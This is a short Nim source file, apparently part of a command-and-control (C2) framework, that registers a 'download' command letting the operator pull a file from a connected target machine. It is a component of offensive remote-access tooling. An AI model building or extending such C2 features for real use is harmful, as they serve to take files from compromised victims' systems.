import asyncdispatch, tables

import ../../types, ../../communication, ../../logging

import ../../../clientTasks/download

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  if len(args) < 1:
    errorLog "you must specify a path, see 'help download'"
    return
  
  let task = await download.sendTask(server.cli.handlingClient, args[0])
  
  await task.awaitResponse()

let cmd*: Command = Command(
  execProc: execProc,
  name: "download",
  argsLength: 1,
  usage: @["download \"[path]\""],
  cliMode: @[ClientInteractMode],
  description: "Download a file from the target",
  category: CCClientInteraction,
  requiresConnectedClient: true
)